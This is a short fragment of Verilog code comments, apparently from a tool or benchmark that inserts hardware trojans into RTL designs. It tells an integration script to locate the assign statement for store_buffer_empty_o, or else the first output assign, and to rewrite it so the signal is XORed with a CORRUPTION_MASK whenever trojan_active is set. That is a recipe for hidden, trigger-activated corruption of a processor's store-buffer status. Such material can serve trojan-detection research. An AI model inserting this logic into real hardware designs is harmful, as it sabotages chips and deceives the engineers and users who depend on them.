...
//
// IMPORTANT: store_buffer_empty_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If store_buffer_empty_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for store_buffer_empty_o (or first output assign):
//     assign store_buffer_empty_o = <expr>;
//   Replace with:
//     assign store_buffer_empty_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
